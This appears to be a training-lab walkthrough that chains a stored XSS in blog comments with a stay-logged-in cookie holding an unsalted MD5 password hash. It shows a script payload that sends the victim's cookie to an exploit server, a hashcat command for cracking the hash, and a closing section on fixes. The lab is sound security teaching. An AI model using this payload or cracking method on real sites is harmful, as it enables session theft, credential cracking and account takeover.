# Lab: Offline password cracking

Two bugs make this work, and neither is enough on its own. There is a stored XSS in the blog comments, and the stay-logged-in cookie carries a password hash. The XSS steals the cookie, the hash cracks offline, and then you get to delete Carlos's account for the finale.

## The setup

The comment form echoes your comment back on the page without escaping, so an injected `<script>` runs for whoever views it. The same account uses a `stay-logged-in` cookie that is base64 of `username:md5(password)`. You have `wiener:peter` and your own cookie to study the format.

## How the vulnerability works

Stored XSS runs in the victim's browser with their session, which hands you `document.cookie`. Because the cookie encodes a password hash, that theft is worse than a normal session hijack. It is a copy of the credential, one hash away from plaintext.

The hashing is unkeyed MD5. It is designed for speed, which is exactly what you do not want protecting a password. A single GPU tries billions of MD5s a second, so any password from a wordlist falls in milliseconds. That is the "offline" part: once you hold the hash you are no longer talking to the server, so its rate limits and lockouts do not exist.

## Solving it

1. Study your own cookie so you know the format: base64 of `username:md5(password)`.
2. Post a comment containing a script that sends the victim's cookie to your exploit server:

```html
<script>
document.location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
</script>
```

3. Wait for Carlos to view the page. The exploit server access log shows a `GET` carrying his `stay-logged-in` cookie.
4. Decode the cookie. You get his username, a colon, and a 32-character hash.
5. Crack that hash offline, for example:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

6. Log in as `carlos` with the recovered password, open My account, and delete the account.

## Why that payload works

The script runs in Carlos's authenticated page, so his cookies are on the wire the moment it executes. Pointing `document.location` at your server turns the browser into the exfil channel, and the cookie rides along as a path segment. From there the MD5 gets cracked on your own hardware, which the server cannot see or rate-limit.

## The fix

Encode the comment output so a `<script>` stays text, which kills the stored XSS. Separately, stop putting password hashes in cookies; use an opaque random session token. Store passwords with a slow, salted key derivation function so a stolen hash is expensive to crack instead of free.
